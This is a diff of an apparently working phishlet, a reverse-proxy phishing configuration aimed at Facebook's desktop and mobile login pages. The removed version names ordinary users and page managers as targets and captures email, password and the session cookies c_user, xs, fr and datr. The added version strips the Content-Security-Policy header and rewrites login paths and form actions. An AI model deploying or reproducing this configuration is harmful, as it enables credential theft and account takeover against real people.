@@ -1,30 +1,20 @@
-# PHISHLET FINAL : FACEBOOK (VANTABLACK SOCIAL POWER)
-# CIBLE : GRAND PUBLIC & GESTIONNAIRES DE PAGES
-# OPTIMISÉ POUR MOBILE (M.FACEBOOK.COM)
-min_ver: '3.0.0'
+name: "Facebook-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false}
-
-sub_filters:
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
-
-auth_tokens:
-  - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'fr', 'datr']
-
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'pass'
-    search: '(.*)'
-    type: 'post'
-
-login:
-  domain: 'www.facebook.com'
-  path: '/login.php'
+  - subdomain: "facebook"
+    target: "www.facebook.com"
+auth_urls: ["/login", "/login/device-based/regular/login"]
+landing_path: ["/login"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/tr/|/connect/xd_arbiter", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"]", action_to: "/login/device"}
